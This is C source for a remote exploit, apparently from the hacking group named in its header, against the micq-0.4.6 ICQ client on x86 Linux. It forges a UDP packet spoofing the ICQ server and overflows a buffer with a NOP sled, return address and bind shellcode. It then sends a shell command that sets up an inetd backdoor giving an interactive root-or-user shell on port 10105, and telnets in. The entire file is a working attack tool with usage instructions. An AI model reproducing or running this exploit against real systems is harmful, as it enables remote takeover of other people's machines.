/*
                [ micRAq ] - by tHE rECIdjVO <recidjvo@pkcrew.org>
                        Packet Knights - http://www.pkcrew.org/

   - version affected: micq-0.4.6 - maybe others (http://freshmeat.net/)
   - coded for: ix86/Linux-2.2.16
   - gcc version: egcs-2.91.66

   usage: ./micRAq <client_ip> <client_port> <server_ip> <hex_session> [address]

   Please read PkC Advisory #003 first.
   Catch parameters with tcpdump-3.6.1 (http://www.tcpdump.org/)
   Last 4 shown bytes are <hex_session>
   # tcpdump -i <interface> -s 49 -tnx udp src port 4000

   Dedicated to: Francesca (I'll never forget you :*)
   Tnx: |CyRaX|, asynchro, vecna, Nail, [ndk], MatOfPeng

                                                                        */

#define DEFAULT_BUFFER_ADDRESS 0xbfffeea0
#define OFFSET 991
#define ICQ_SERVER_PORT 4000
#define BACK_PORT "10105"
#define NOP '\x90'
#define COMMAND "echo -e \"" BACK_PORT " stream tcp nowait `whoami` /bin/sh sh -i\">/tmp/.micRAqbd;/usr/sbin/inetd /tmp/.micRAqbd;sleep 1;rm /tmp/.micRAqbd;exit;"

#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/udp.h>

int main(int argc, char *argv[]);
unsigned short in_cksum (u_short *addr, int len); // Ripped. Who didn't it? ;)
void build_buffer(char *buffer, unsigned long *buff_addr);
int go(char *ip);

// bind shellcode by [multiple]
char shellcode[]=
        "\x89\xe5\x31\xd2\xb2\x66\x89\xd0\x31\xc9\x89\xcb\x43\x89\x5d\xf8"
        "\x43\x89\x5d\xf4\x4b\x89\x4d\xfc\x8d\x4d\xf4\xcd\x80\x31\xc9\x89"
        "\x45\xf4\x43\x66\x89\x5d\xec\x66\xc7\x45\xee\x0f\x27\x89\x4d\xf0"
        "\x8d\x45\xec\x89\x45\xf8\xc6\x45\xfc\x10\x89\xd0\x8d\x4d\xf4\xcd"
        "\x80\x89\xd0\x43\x43\xcd\x80\x89\xd0\x43\xcd\x80\x89\xc3\x31\xc9"
        "\xb2\x3f\x89\xd0\xcd\x80\x89\xd0\x41\xcd\x80\xeb\x18\x5e\x89\x75"
        "\x08\x31\xc0\x88\x46\x07\x89\x45\x0c\xb0\x0b\x89\xf3\x8d\x4d\x08"
        "\x8d\x55\x0c\xcd\x80\xe8\xe3\xff\xff\xff/bin/sh";

typedef struct
{
        unsigned char uin[4];
        unsigned char year[2];
        unsigned char month;
        unsigned char day;
        unsigned char hour;
        unsigned char minute;
        unsigned char type[2];
        unsigned char len[2];
} RECV_MESSAGE, *RECV_MESSAGE_PTR;

struct SRV_ICQ_pak
{
        unsigned char ver[2];
        unsigned char zero;
        unsigned char session[4];
        unsigned char cmd[2];
        unsigned char seq[2];
        unsigned char seq2[2];
        unsigned char UIN[4];
        unsigned char check[4];
};

struct srv_net_icq_pak
{
        struct SRV_ICQ_pak head;
        unsigned char data[1024];
};

unsigned short in_cksum (u_short *addr, int len)
{
        register int nleft = len;
        register u_short *w = addr;
        register int sum = 0;
        u_short answer = 0;

        while (nleft > 1) {
                sum += *w++;
                nleft -= 2;
        }
        if (nleft == 1) {
                *(u_char *)(&answer) = *(u_char *)w;
                sum += answer;
        }

        sum = (sum >> 16) + (sum & 0xffff);
        sum += (sum >> 16);
        answer = ~sum;
        return(answer);
}

void build_buffer(char *buffer, unsigned long *buff_addr)
{
        // Fill the data headers
        memset(buffer, '\b', 1024);
        memset(buffer, '\0', 7);
        buffer[4] = '\x04';
        buffer[8] = '\xFE';

        // Fill the buffer
        memset(buffer + 9, NOP, strtoul(buffer, NULL, 10) + OFFSET - strlen(shellcode) - 9);
        memcpy(buffer + OFFSET - strlen(shellcode), shellcode, strlen(shellcode));
        memcpy(buffer + OFFSET, buff_addr, 4);
        buffer[1023] = '\0';
        return;
}       

int go(char *ip)
{
        int sock, conn;
        struct sockaddr_in saddr;

        // Create socket
        if((sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) < 0) {
                perror("socket()");
                return(-1);
        }

        saddr.sin_family = AF_INET;
        saddr.sin_addr.s_addr = inet_addr(ip);
        saddr.sin_port = htons(3879);

        // Connect to 3879 and issue COMMAND
        if((conn = connect(sock, (struct sockaddr *)&saddr, sizeof(saddr))) < 0) {
                perror("connect()");
                return(-1);
        }

        send(sock, COMMAND, sizeof(COMMAND), 0);

        // All done here
        close(sock);
        return(0);
}

int main(int argc, char *argv[])
{
        int sock, i, hincl = 1;
        unsigned long buff_addr = DEFAULT_BUFFER_ADDRESS;
        struct sockaddr_in saddr;
        struct ip *pip;
        struct udphdr *pudp;
        char *packet, conv[3];
        struct srv_net_icq_pak *pak;
        RECV_MESSAGE_PTR r_data;

        printf("\n\t[ [ micRAq ] - by tHE rECIdjVO <recidjvo@pkcrew.org> ]\n\t\tPacket Knights - http://www.pkcrew.org/\n\n");

        if((argc != 5) && (argc != 6)) {
                printf("usage: %s <client_ip> <client_port> <server_ip> <hex_session> [buffer]\n\n", argv[0]);
                exit(-1);
        }

        if(strlen(argv[4]) != 8) {
                printf("Error: <session> must be 8 digits exadecimal number.\n\n");
                exit(-1);
        }

        if(argc == 6) {
                buff_addr = strtoul(argv[5], NULL, 16);
        }
        printf("Using buffer address: 0x%x\n\n", buff_addr);

        // Create the RAW socket
        if((sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0) {
                perror("socket()");
                exit(-1);
        }

        if(setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &hincl, sizeof(hincl)) < 0) {
                perror("setsockopt()");
                close(sock);
                exit(-1);
        }

        // Set pointers
        packet = malloc(sizeof(struct ip) + sizeof(struct udphdr) + 1024);
        pip = (struct ip *)packet;
        pudp = (struct udphdr *)(packet + sizeof(struct ip));
        pak = (struct srv_net_icq_pak *)(packet + sizeof(struct ip) + sizeof(struct udphdr));

        // Clear packet
        memset(packet, 0, sizeof(struct ip) + sizeof(struct udphdr) + 1024);

        // Fill the packet headers
        saddr.sin_family = AF_INET;
        saddr.sin_addr.s_addr = inet_addr(argv[1]);
        pip->ip_len = htons(sizeof(struct ip) + sizeof(struct udphdr) + 1024);
        pip->ip_hl = 5;
        pip->ip_v = 4;
        pip->ip_ttl = 255;
        pip->ip_tos = 0;
        pip->ip_off = 0;
        pip->ip_id = htons(getpid());
        pip->ip_p = IPPROTO_UDP;
        pip->ip_src.s_addr = inet_addr(argv[3]);
        pip->ip_dst.s_addr = inet_addr(argv[1]);
        pip->ip_sum = in_cksum((u_short*)pip, sizeof(struct ip));
        pudp->source = htons(ICQ_SERVER_PORT);
        pudp->dest = htons(atoi(argv[2]));
        pudp->len = htons(sizeof(struct udphdr) + 1024);
        pudp->check = 0;

        // Fill the message headers
        pak->head.ver[0] = 5;
        pak->head.ver[1] = 0;
        pak->head.zero = 0;

        for(i = 0; i < 8; i += 2) {
                conv[0] = argv[4][i];
                conv[1] = argv[4][i + 1];
                conv[2] = '\0';

                pak->head.session[i / 2] = strtol(conv, NULL, 16);
        }

        pak->head.cmd[0] = 4;
        pak->head.cmd[1] = 1;
        pak->head.seq[0] = 0;
        pak->head.seq[1] = 0;
        pak->head.seq2[0] = 0;
        pak->head.seq2[1] = 0;
        pak->head.UIN[0] = 0;
        pak->head.UIN[1] = 0;
        pak->head.UIN[2] = 0;
        pak->head.UIN[3] = 0;
        pak->head.check[0] = 0;
        pak->head.check[1] = 0;
        pak->head.check[2] = 0;
        pak->head.check[3] = 0;

        // Fill the buffer
        build_buffer(pak->data, &buff_addr);

        // Send the packet
        if(sendto(sock, packet, sizeof(struct ip) + sizeof(struct udphdr) + 1024, 0, (struct sockaddr *)&saddr, sizeof(struct sockaddr_in)) < 0) {
                perror("sendto()");
                close(sock);
                exit(-1);
        }

        // Clear the socket
        close(sock);

        // Send command to execute inetd backdoor
        sleep(1);

        // First connect
        if(go(argv[1]) < 0) {
                printf("Unable to connect :\\\n");
                exit(-1);
        }

        // Wait a bit to let the command to be issued
        sleep(1);
        printf("\t\"To be");
        fflush(stdout);
        sleep(2);
        printf(", or not to be.\n");
        sleep(1);
        printf("\t This is the question.\"\n");
        sleep(1);
        printf("\t\t\t(William Shakespeare)\n\n");

        // Connect to remote host
        execl("/usr/bin/telnet", "telnet", argv[1], BACK_PORT, NULL);

        // Never been here
        exit(-1);
}

/*                          micRAq.c - EOF                              */
